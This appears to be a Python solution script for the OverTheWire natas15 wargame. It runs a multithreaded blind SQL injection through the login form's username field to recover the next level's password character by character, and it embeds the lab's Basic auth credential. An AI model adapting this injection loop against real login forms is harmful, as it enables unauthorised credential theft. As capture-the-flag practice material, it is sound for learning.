#!/usr/bin/env python3
import requests as req
from requests.auth import HTTPBasicAuth
import re
import sys
from colorama import Fore
import concurrent.futures

inputs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
list = [element for element in inputs]
password = ''
headers = {
    "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
}
url = "http://natas15.natas.labs.overthewire.org/index.php?debug"


def make_request(params):
    global headers
    global url
    global password
    payload = 'natas16\" and SUBSTRING(password, ' + \
        str(params["x"]) + ', 1) LIKE BINARY \"%' + params["i"] + '%\"#'

    data = {
        "username": payload
    }
    try:
        res = req.post(url, headers=headers, data=data, timeout=5)
    except req.exceptions.Timeout:
        print(Fore.LIGHTRED_EX +
              "\n[!] Timeout, Continueing again" + Fore.WHITE)
    #print("[*]" + payload + " ==> " + password)
    sys.stdout.write(
        Fore.LIGHTGREEN_EX + "[+] " + params["i"] + "  ==> " + Fore.GREEN + password+"\r" + Fore.WHITE)
    sys.stdout.flush()
    return {"res": res, "char": params["i"]}


def match_char(x):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        temp_list = []
        for el in list:
            temp_list.append({"x": x, "i": el})
        results = executor.map(make_request, temp_list)
        pattern = re.compile(r'exists')
    for result in results:
        match = pattern.findall(result["res"].text)
        if(len(match) > 0):
            return result["char"]


for abrar in range(32):
    try:
        password = password + match_char(abrar+1)
    except KeyboardInterrupt:
        exit(
            Fore.RED + "\n[-] Detected Keyboard interrupt. Terminating...." + Fore.WHITE)
